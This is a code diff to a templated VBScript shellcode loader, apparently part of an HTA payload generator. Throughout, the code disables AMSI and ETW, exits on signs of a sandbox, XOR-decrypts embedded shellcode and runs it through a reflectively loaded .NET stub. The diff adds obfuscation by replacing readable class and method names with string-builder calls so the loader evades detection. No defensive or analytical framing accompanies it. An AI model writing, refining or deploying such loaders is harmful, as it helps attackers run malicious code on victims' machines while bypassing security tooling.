@@ -21,7 +21,7 @@ End Function
 
 Sub {{ v.fn_amsi }}()
     On Error Resume Next
-    Dim asm: Set asm = CreateObject("System.Reflection.Assembly")
+    Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     Dim amsiT: Set amsiT = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_auto_amsi_utils }})))
     If Not amsiT Is Nothing Then
         amsiT.GetField({{ v.fn_build_str }}(Array({{ v.jsc_amsi_init_fail }})), 36).SetValue Nothing, True
@@ -30,7 +30,7 @@ End Sub
 
 Sub {{ v.fn_etw }}()
     On Error Resume Next
-    Dim asm: Set asm = CreateObject("System.Reflection.Assembly")
+    Dim asm: Set asm = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     Dim t: Set t = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_eventing_ep }})))
     If Not t Is Nothing Then
         Dim fi: Set fi = t.GetField({{ v.fn_build_str }}(Array({{ v.jsc_m_enabled }})), 36)
@@ -105,10 +105,10 @@ End Function
 Sub {{ v.sub_run }}()
     If {{ v.fn_sandbox }}() Then self.close: Exit Sub
     ' Record cursor position before delay; check movement after — no extra wait
-    Dim _cx0 As Long, _cy0 As Long, _gotCur As Boolean
+    Dim _cx0, _cy0, _gotCur
     _cx0 = -999: _cy0 = -999: _gotCur = False
     On Error Resume Next
-    Dim _ca: Set _ca = CreateObject("System.Reflection.Assembly")
+    Dim _ca: Set _ca = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     If Err.Number = 0 Then
         Dim _wf: Set _wf = _ca.LoadWithPartialName("System.Windows.Forms")
         If Err.Number = 0 And Not IsNull(_wf) And Not IsEmpty(_wf) Then
@@ -134,7 +134,7 @@ Sub {{ v.sub_run }}()
     ' Cursor check: if position unchanged over the delay, treat as sandbox
     If _gotCur Then
         On Error Resume Next
-        Dim _ca2: Set _ca2 = CreateObject("System.Reflection.Assembly")
+        Dim _ca2: Set _ca2 = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
         If Err.Number = 0 Then
             Dim _wf2: Set _wf2 = _ca2.LoadWithPartialName("System.Windows.Forms")
             If Err.Number = 0 And Not IsNull(_wf2) And Not IsEmpty(_wf2) Then
@@ -144,7 +144,7 @@ Sub {{ v.sub_run }}()
                     If Err.Number = 0 And Not IsNull(_pp2) Then
                         Dim _ps2: Set _ps2 = _pp2.GetValue(Nothing, Nothing)
                         If Err.Number = 0 And Not IsNull(_ps2) Then
-                            Dim _cx2 As Long, _cy2 As Long
+                            Dim _cx2, _cy2
                             _cx2 = _ps2.GetType().GetProperty("X").GetValue(_ps2, Nothing)
                             _cy2 = _ps2.GetType().GetProperty("Y").GetValue(_ps2, Nothing)
                             If Err.Number = 0 Then
@@ -165,9 +165,9 @@ Sub {{ v.sub_run }}()
     sc_hex  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
     key_hex = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
 
-    Dim _k() As Byte
+    Dim _k()
     _k = {{ v.fn_hex2arr }}(key_hex)
-    Dim _ki As Long
+    Dim _ki
     For _ki = 0 To UBound(_k): _k(_ki) = _k(_ki) Xor {{ key_tweak }}: Next
 
     Dim sc(), i
@@ -177,7 +177,7 @@ Sub {{ v.sub_run }}()
                 _k(i Mod (UBound(_k) + 1))
     Next
 
-    Dim loader: Set loader = CreateObject("System.Reflection.Assembly")
+    Dim loader: Set loader = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     Dim stub_hex: stub_hex = "{{ v.dotnet_stub_hex }}"
     Dim stub_bytes(): ReDim stub_bytes(Len(stub_hex) / 2 - 1)
     For i = 0 To Len(stub_hex) / 2 - 1
@@ -185,8 +185,8 @@ Sub {{ v.sub_run }}()
     Next
 
     Dim asm: Set asm = loader.Load((stub_bytes))
-    Dim t:   Set t   = asm.GetType("Stub.Loader")
-    Dim mi:  Set mi  = t.GetMethod("Run")
+    Dim t:   Set t   = asm.GetType({{ v.fn_build_str }}(Array({{ v.jsc_stub_loader }})))
+    Dim mi:  Set mi  = t.GetMethod({{ v.fn_build_str }}(Array({{ v.jsc_stub_run }})))
     mi.Invoke Nothing, Array((sc))
     self.close
 End Sub
